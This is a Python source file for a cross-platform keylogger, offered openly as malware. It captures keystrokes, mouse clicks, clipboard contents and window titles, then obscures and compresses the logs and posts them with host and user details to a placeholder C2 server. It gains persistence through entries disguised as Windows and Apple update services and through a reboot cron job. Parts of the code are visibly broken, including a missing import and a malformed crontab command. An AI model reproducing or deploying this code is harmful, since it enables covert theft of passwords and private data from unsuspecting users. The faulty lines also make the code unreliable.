import os
import sys
import json
import base64
import zlib
import threading
import time
import socket
import requests
from datetime import datetime
from pathlib import Path

# Cross-platform imports
if sys.platform.startswith('win'):
    import win32api
    import win32con
    import pythoncom
    import pyHook
    from pynput import keyboard as kb_win
    from pynput import mouse as ms_win
elif sys.platform.startswith('darwin'):
    from pynput import keyboard as kb_mac
    from pynput import mouse as ms_mac
else:  # Linux
    from pynput import keyboard as kb_linux
    from pynput import mouse as ms_linux
    import evdev


class AdvancedKeyLogger:
    def __init__(self, config_file='keylogger_config.json'):
        self.platform = sys.platform
        self.log_buffer = []
        self.session_start = datetime.now()
        self.mouse_events = []
        self.clipboard_history = []
        self.screen_captures = []
        self.running = True

        # Load configuration
        self.config = self.load_config(config_file)

        # Stealth settings
        self.stealth_mode = self.config.get('stealth', True)
        self.send_interval = self.config.get('send_interval', 60)
        self.max_buffer_size = self.config.get('max_buffer_size', 1024 * 1024)

        # C2 settings
        self.c2_server = self.config.get('c2_server', 'http://your-c2-server.com')
        self.c2_token = self.config.get('c2_token', 'your-auth-token')

        # Start background threads
        self.start_logging()

    def load_config(self, config_file):
        """Load configuration with defaults"""
        default_config = {
            'stealth': True,
            'send_interval': 60,
            'max_buffer_size': 1024 * 1024,
            'c2_server': 'http://your-c2-server.com',
            'c2_token': 'your-auth-token',
            'capture_clipboard': True,
            'capture_mouse': True,
            'capture_window_title': True,
            'encrypt_logs': True,
            'compress_logs': True
        }

        config_path = Path(config_file)
        if config_path.exists():
            with open(config_file, 'r') as f:
                user_config = json.load(f)
                default_config.update(user_config)

        return default_config

    def get_window_title(self):
        """Get active window title (cross-platform)"""
        if sys.platform.startswith('win'):
            try:
                hwnd = win32gui.GetForegroundWindow()
                _, title = win32gui.GetWindowText(hwnd), win32gui.GetWindowText(hwnd)
                return title
            except:
                return "Unknown"
        elif sys.platform.startswith('darwin'):
            try:
                import subprocess
                result = subprocess.run(['osascript', '-e',
                                         'tell app "System Events" to get name of first process whose frontmost is true'],
                                        capture_output=True, text=True)
                return result.stdout.strip()
            except:
                return "Unknown"
        else:  # Linux
            try:
                import subprocess
                result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'],
                                        capture_output=True, text=True)
                return result.stdout.strip()
            except:
                return "Unknown"

    def log_event(self, event_type, data):
        """Log event with metadata"""
        timestamp = datetime.now().isoformat()
        window_title = self.get_window_title() if self.config.get('capture_window_title') else "N/A"

        event = {
            'timestamp': timestamp,
            'platform': self.platform,
            'window': window_title,
            'type': event_type,
            'data': data
        }

        self.log_buffer.append(event)

        # Auto-flush if buffer too large
        if len(json.dumps(self.log_buffer)) > self.max_buffer_size:
            self.flush_logs()

    def capture_clipboard(self):
        """Capture clipboard changes"""
        if not self.config.get('capture_clipboard'):
            return

        last_clipboard = ""
        while self.running:
            try:
                if sys.platform.startswith('win'):
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                elif sys.platform.startswith('darwin'):
                    import subprocess
                    result = subprocess.run(['pbpaste'], capture_output=True, text=True)
                    data = result.stdout.strip()
                else:  # Linux
                    import subprocess
                    result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'],
                                            capture_output=True, text=True)
                    data = result.stdout.strip()

                if data != last_clipboard and data.strip():
                    self.log_event('CLIPBOARD', data[:1000])  # Limit size
                    last_clipboard = data
            except:
                pass
            time.sleep(2)

    def on_key_press(self, key):
        """Handle keyboard events"""
        try:
            if hasattr(key, 'char') and key.char:
                char = key.char
            elif hasattr(key, 'vk'):
                char = f"[VK{key.vk}]"
            else:
                char = f"[{key}]"

            self.log_event('KEY', char)
        except:
            pass

    def on_mouse_click(self, x, y, button, pressed):
        """Handle mouse events"""
        if self.config.get('capture_mouse'):
            button_name = str(button).split('.')[-1]
            self.log_event('MOUSE', f"{button_name} {x},{y} {'DOWN' if pressed else 'UP'}")

    def start_keyboard_listener(self):
        """Start platform-specific keyboard listener"""
        if sys.platform.startswith('win'):
            self.keyboard_listener = kb_win.Listener(on_press=self.on_key_press)
        elif sys.platform.startswith('darwin'):
            self.keyboard_listener = kb_mac.Listener(on_press=self.on_key_press)
        else:  # Linux
            self.keyboard_listener = kb_linux.Listener(on_press=self.on_key_press)

        self.keyboard_listener.start()

    def start_mouse_listener(self):
        """Start platform-specific mouse listener"""
        if self.config.get('capture_mouse'):
            if sys.platform.startswith('win'):
                self.mouse_listener = ms_win.Listener(on_click=self.on_mouse_click)
            elif sys.platform.startswith('darwin'):
                self.mouse_listener = ms_mac.Listener(on_click=self.on_mouse_click)
            else:  # Linux
                self.mouse_listener = ms_linux.Listener(on_click=self.on_mouse_click)

            self.mouse_listener.start()

    def encrypt_data(self, data):
        """Simple XOR encryption with key rotation"""
        key = sum(ord(c) for c in str(self.session_start)) % 256
        encrypted = bytearray()
        for i, char in enumerate(data):
            encrypted.append(ord(char) ^ (key + i % 256))
        return base64.b64encode(bytes(encrypted)).decode()

    def compress_data(self, data):
        """Compress data before sending"""
        return base64.b64encode(zlib.compress(data.encode())).decode()

    def send_logs(self):
        """Send compressed/encrypted logs to C2"""
        while self.running:
            time.sleep(self.send_interval)
            self.flush_logs()

    def flush_logs(self):
        """Flush buffer to C2 server"""
        if not self.log_buffer:
            return

        try:
            # Prepare payload
            payload = {
                'session_id': f"{self.platform}_{int(time.time())}",
                'logs': self.log_buffer,
                'system_info': {
                    'hostname': os.uname().nodename if hasattr(os, 'uname') else os.getenv('COMPUTERNAME'),
                    'platform': self.platform,
                    'username': os.getenv('USER') or os.getenv('USERNAME'),
                    'duration': (datetime.now() - self.session_start).total_seconds()
                }
            }

            # Encrypt and compress
            if self.config.get('encrypt_logs'):
                payload['logs'] = self.encrypt_data(json.dumps(payload['logs']))
            if self.config.get('compress_logs'):
                payload['logs'] = self.compress_data(json.dumps(payload['logs']))

            # Send to C2
            headers = {'Authorization': f'Bearer {self.c2_token}'}
            response = requests.post(f"{self.c2_server}/receive",
                                     json=payload,
                                     headers=headers,
                                     timeout=10)

            if response.status_code == 200:
                self.log_buffer.clear()
                print(f"[+] Logs sent successfully ({len(payload['logs'])} bytes)")
            else:
                print(f"[-] Failed to send logs: {response.status_code}")

        except Exception as e:
            print(f"[-] Send error: {e}")

    def persistence(self):
        """Add persistence (platform-specific)"""
        if self.stealth_mode:
            script_path = os.path.abspath(sys.argv[0])
            if sys.platform.startswith('win'):
                # Windows registry persistence
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                                     winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
            elif sys.platform.startswith('darwin'):
                # macOS LaunchAgent
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updateservice</string>
    <key>ProgramArguments</key>
    <array>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                plist_path = Path.home() / "Library/LaunchAgents/com.apple.updateservice.plist"
                plist_path.write_text(plist_content)
            else:  # Linux
                # Cron job persistence
                cron_job = f"@reboot {script_path}\n"
                os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}')" | crontab - ")

    def start_logging(self):
        """Start all logging threads"""
        # Add persistence
        self.persistence()

        # Start listeners
        self.start_keyboard_listener()
        self.start_mouse_listener()

        # Start background threads
        clipboard_thread = threading.Thread(target=self.capture_clipboard, daemon=True)
        send_thread = threading.Thread(target=self.send_logs, daemon=True)

        clipboard_thread.start()
        send_thread.start()

        print(f"[+] Advanced Keylogger started on {self.platform}")
        print(f"[+] C2 Server: {self.c2_server}")
        print("[+] Press Ctrl+C to stop")

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            self.flush_logs()
            print("\n[+] Keylogger stopped")


if __name__ == "__main__":
    # Create default config if needed
    if not Path('keylogger_config.json').exists():
        with open('keylogger_config.json', 'w') as f:
            json.dump({
                'stealth': True,
                'send_interval': 60,
                'max_buffer_size': 1024 * 1024,
                'c2_server': 'http://your-c2-server.com',
                'c2_token': 'your-auth-token',
                'capture_clipboard': True,
                'capture_mouse': True,
                'capture_window_title': True,
                'encrypt_logs': True,
                'compress_logs': True
            }, f, indent=2)

    logger = AdvancedKeyLogger()